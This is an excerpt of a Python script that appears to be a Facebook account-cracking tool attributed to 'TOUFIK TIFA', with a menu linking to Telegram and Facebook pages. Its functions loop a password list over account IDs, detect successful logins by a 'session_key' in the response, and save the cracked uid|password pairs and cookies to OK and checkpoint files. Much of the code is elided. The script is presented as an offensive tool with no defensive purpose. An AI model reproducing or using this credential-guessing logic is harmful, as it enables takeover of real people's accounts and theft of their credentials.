# Orignally Written By TOUFIK TIFA
...
def Main_MAFIA():
		...
		if shm =='1':
			...
			wp=(' ')
			os.system(f'xdg-open https://t.me/mafia16xv/{wp}')
			Main_MAFIA()
		elif shm =='5':
			os.system('xdg-open ttps://www.facebook.com/mafiams16')
			Main_MAFIA()
		elif shm =='0':
	...
	try:
		...
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [DALAG-OK] '+uid+' | '+pas)
						#print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'DALAG_RND_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'DALAG_COOKIEs.txt')
						...
						file_path = os.path.join(folder_path, 'DALAG-CP.txt')
...
def api1(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [TOUFIK-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'TOUFIK_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\33[1m\33[1;35m [TOUFIK -CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'TOUFIK-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
